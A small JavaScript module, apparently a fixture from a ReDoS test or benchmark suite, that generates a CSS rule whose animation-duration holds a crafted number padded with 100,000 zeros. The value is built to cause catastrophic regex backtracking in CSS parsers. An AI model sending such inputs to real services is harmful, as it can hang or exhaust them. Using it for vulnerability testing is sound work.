function getPayload() {
  const prefix = "-+.0";
  const suffix = "-0";
  const pump = [];
  for (let i = 0; i < 10000; i++) {
    pump.push("0000000000");
  }
  const input =
    ".block{animation:1s test;animation-duration:" +
    prefix +
    pump.join("") +
    suffix +
    "s}";
  return { input };
}

module.exports = { getPayload };